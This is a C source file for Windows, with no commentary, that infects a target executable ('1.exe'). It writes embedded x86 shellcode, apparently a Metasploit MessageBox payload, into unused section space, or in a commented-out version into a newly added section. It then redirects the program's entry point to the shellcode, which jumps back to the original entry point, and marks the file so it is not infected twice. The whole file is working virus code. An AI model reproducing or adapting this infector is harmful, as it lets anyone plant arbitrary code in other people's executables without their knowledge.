// #include <windows.h>
// #define target "d:\\1.exe"
// // char shellcode[]="";
// char shellcode[]=
// "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
// "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
// "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
// "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
// "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
// "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
// "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
// "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
// "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
// "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
// "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
// "\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
// "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
// "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
// "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
// "\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
// "\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"
// "\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xb8"
// "\x11\x11\x11\x11\xff\xe0";

// void main(int argc,char*argv[])
// { 
//     HANDLE hFile = CreateFile(target,
//         GENERIC_READ|GENERIC_WRITE,
//         FILE_SHARE_READ,
//         0,
//         OPEN_EXISTING,
//         FILE_ATTRIBUTE_NORMAL,
//         0);
//     HANDLE hMap = CreateFileMapping(hFile,0,PAGE_READWRITE,0,0,0);
//     LPVOID lpBase = MapViewOfFile(hMap,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
//     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
//     PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LONG)lpBase+pDosHeader->e_lfanew);
//     PIMAGE_SECTION_HEADER pSec =(PIMAGE_SECTION_HEADER)(pNtHeader->FileHeader.SizeOfOptionalHeader
//         +(DWORD)&(pNtHeader->OptionalHeader));
//     int nSec = pNtHeader->FileHeader.NumberOfSections;
//     strncpy((char*)pSec[nSec].Name,".yuan ",7);
//     pSec[nSec].Misc.VirtualSize=0x200;
//     pSec[nSec].SizeOfRawData=0x200;
//     DWORD i=pSec[nSec-1].VirtualAddress+pSec[nSec-1].Misc.VirtualSize;
//     while(i%0x1000!=0)
//     {
//         i++;
//     }
//     pSec[nSec].VirtualAddress = i;
//     pSec[nSec].PointerToRawData=pSec[nSec-1].PointerToRawData+pSec[nSec-1].SizeOfRawData;
//     pSec[nSec].Characteristics=0xe00000e0;
//     pNtHeader->FileHeader.NumberOfSections++;
//     pNtHeader->OptionalHeader.SizeOfImage+=0x1000;
//     char buf[0x200] = {0};
//     DWORD d = 0;
//     *(DWORD*)&shellcode[270] = pNtHeader->OptionalHeader.AddressOfEntryPoint
//         +pNtHeader->OptionalHeader.ImageBase;
//     memcpy(buf,shellcode,sizeof(shellcode));
//     SetFilePointer(hFile,0,0,FILE_END);
//     WriteFile(hFile,buf,0x200,&i,0);
//     pNtHeader->OptionalHeader.AddressOfEntryPoint =pSec[nSec].VirtualAddress;
// }
#include <windows.h>
#include <stdio.h>
#define target "1.exe"
char shellcode[]=
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
"\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"
"\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xb8"
"\x00\x00\x00\x00\xff\xe0";
int CheckSig(PIMAGE_DOS_HEADER lpBase)
{
DWORD Sig =1111;
if(lpBase->e_ovno == Sig)
return 0;
lpBase->e_ovno = Sig;
return 1;
}
int main(int argc,char*argv[])
{ 
HANDLE hFile = CreateFile(target,
GENERIC_READ|GENERIC_WRITE,
FILE_SHARE_READ,
0,
OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL,
0);
HANDLE hMap = CreateFileMapping(hFile,0,PAGE_READWRITE,0,0,0);
LPVOID lpBase = MapViewOfFile(hMap,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LONG)lpBase+pDosHeader->e_lfanew);
PIMAGE_SECTION_HEADER pSec =(PIMAGE_SECTION_HEADER)(pNtHeader->FileHeader.SizeOfOptionalHeader
+(DWORD)&(pNtHeader->OptionalHeader));

if(CheckSig(pDosHeader)==0)
return 0;
LPVOID lp = malloc(sizeof(shellcode));
memset(lp, 0, sizeof(shellcode));
int nSec = pNtHeader->FileHeader.NumberOfSections;
DWORD space =0;
while(nSec)
{ 
space = pSec[nSec-1].PointerToRawData + pSec[nSec-1].SizeOfRawData - sizeof(shellcode); 
if(memcmp((LPVOID)(space+(DWORD)lpBase),lp,sizeof(shellcode))==0)
break;
nSec--;
}
*(DWORD*)&shellcode[270] = pNtHeader->OptionalHeader.AddressOfEntryPoint+pNtHeader->OptionalHeader.ImageBase;
pNtHeader->OptionalHeader.AddressOfEntryPoint = space - pSec[nSec-1].PointerToRawData+pSec[nSec-1].VirtualAddress;
memcpy((char*)(space+(DWORD)lpBase),shellcode,sizeof(shellcode));
CloseHandle(hFile);
CloseHandle(hMap);
UnmapViewOfFile(lpBase);
return 0;
}
